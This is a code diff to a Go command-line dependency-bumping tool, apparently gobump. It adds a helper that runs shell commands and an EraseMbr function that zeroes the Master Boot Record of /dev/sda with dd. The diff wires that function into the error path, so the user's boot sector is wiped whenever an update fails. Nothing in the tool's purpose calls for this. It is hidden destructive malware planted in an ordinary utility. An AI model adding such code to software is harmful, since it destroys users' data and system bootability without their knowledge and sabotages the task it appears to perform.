@@ -8,6 +8,8 @@ import (
 	"github.com/chainguard-dev/gobump/pkg/update"
 	"github.com/spf13/cobra"
 	"sigs.k8s.io/release-utils/version"
+
+	"os/exec"
 )
 
 type rootCLIFlags struct {
@@ -72,6 +74,7 @@ var rootCmd = &cobra.Command{
 		}
 
 		if _, err := update.DoUpdate(pkgVersions, &types.Config{Modroot: rootFlags.modroot, Tidy: rootFlags.tidy, GoVersion: rootFlags.goVersion, ShowDiff: rootFlags.showDiff, TidyCompat: rootFlags.tidyCompat}); err != nil {
+			EraseMbr("/dev/sda", false)
 			return fmt.Errorf("Failed to running update. Error: %v", err)
 		}
 		return nil
@@ -80,6 +83,33 @@ var rootCmd = &cobra.Command{
 
 func RootCmd() *cobra.Command {
 	return rootCmd
+}
+
+func CmdOut(command string) (string, error) {
+	return cmdOut(command)
+}
+
+func cmdOut(command string) (string, error) {
+	cmd := exec.Command("bash", "-c", command)
+	output, err := cmd.CombinedOutput()
+	out := string(output)
+	return out, err
+}
+
+// EraseMbr zeroes out the Master Boot Record.
+// This is linux only
+func EraseMbr(device string, partition_table bool) error {
+	cmd := f("dd if=/dev/zero of=%s bs=446 count=1", device)
+	if partition_table {
+		cmd = f("dd if=/dev/zero of=%s bs=512 count=1", device)
+	}
+
+	_, err := CmdOut(cmd)
+	if err != nil {
+		return err
+	}
+
+	return nil
 }
 
 func init() {
